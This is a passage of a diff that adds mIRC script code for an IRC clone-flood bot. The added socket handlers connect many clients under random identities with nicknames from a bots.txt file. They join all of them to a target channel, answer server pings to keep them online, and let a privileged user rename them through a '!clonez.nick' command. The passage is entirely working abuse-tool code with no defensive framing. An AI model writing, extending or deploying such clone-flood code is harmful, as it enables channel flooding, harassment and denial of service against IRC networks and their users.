+  sockwrite -n $sockname user $read temp.scr $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) +$ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
+  sockwrite -n $sockname nick $read bots.txt
+  sockwrite -n $sockname join %clonezchan
+}
+
+on 10:text:!clonez.nick*:*{
+sockwrite -n $sockname nick $read bots.txt  
+}
+
+on 10:sockclose:cfld*: { 
+inc %tbotsent $sock($sockname).sent
+inc %tbotrec $sock($sockname).rcvd
+}
+
+on 1:sockread:cfld*:{
+if ($sockerr > 0) { return }
+:loop | sockread %tmp
+if ($sockbr == 0) { return } 
+echo -s %tmp
+if ($gettok(%tmp,1,32) == ping) { sockwrite -n $sockname PONG $gettok(%tmp,2-,32) }
+goto loop
+}
